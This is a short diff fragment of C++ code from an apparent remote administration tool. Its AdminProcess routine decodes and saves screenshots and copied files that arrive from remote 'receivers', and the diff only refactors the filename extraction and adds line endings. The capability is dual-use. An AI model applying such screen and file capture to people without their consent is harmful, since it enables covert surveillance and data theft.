@@ -242,20 +242,15 @@ void MyCurl::AdminProcess(const vector<string> IDs, const int query) {
 						fstream file("_Data/screenshot" + receiverID + ".jpg", ios::out | ios::binary);
 						file << subContent;
 						file.close();
-						cout << "Saved screenshot of " + receiverID;
+						cout << "Saved screenshot of " + receiverID << endl;
 					}
 					else if (query == 20) { //result is fileName
 						subContent = base64_decode(subContent);
-						string fileName;
-						for (int i = result.size() - 1; i >= 0; i--) {
-							if (result[i] == '/') break;
-							fileName.push_back(result[i]);
-						}
-						reverse(fileName.begin(), fileName.end());
+						string fileName = GetFileName();
 						fstream file("_Data/Copy/" + fileName + receiverID, ios::out | ios::binary);
 						file << subContent;
 						file.close();
-						cout << "Saved copy file of at " << "_Data/Copy/" + fileName + receiverID;
+						cout << "Saved copy file of at " << "_Data/Copy/" + fileName + receiverID << endl;
 					}
 					IDSet.erase(receiverID);
 				}
